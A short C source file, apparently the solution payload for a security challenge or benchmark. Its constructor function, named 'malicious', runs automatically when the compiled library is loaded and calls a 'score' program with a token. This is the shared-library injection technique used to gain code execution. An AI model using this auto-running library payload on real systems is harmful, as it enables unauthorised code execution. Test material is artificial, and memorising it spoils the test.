#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score a03ecd59-f7b4-416a-94b1-67e03bc384bd");
}
